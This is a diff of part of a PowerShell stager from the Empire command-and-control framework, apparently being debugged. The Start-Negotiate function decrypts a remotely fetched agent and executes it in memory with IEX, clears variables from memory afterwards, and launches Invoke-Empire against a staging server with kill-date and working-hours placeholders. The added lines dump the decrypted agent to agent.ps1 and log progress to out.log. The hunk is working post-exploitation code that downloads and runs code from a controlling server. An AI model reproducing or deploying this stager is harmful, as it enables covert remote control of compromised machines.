@@ -229,14 +229,18 @@ function Start-Negotiate {
     # # decrypt the agent and register the agent logic
     # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
     # write-host "data len: $($Data.Length)";
+    $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) | Out-File "agent.ps1";
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
     $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
 
+    "stage 0 calling invoke Empire" | Out-File "out.log" -Append -NoCLobber;
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
+    "stage0 done with invoke empire" | Out-File "out.log" -Append -NoClobber
 }
+"calling start negotiate" | Out-File "out.log" -Append -NoClobber;
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
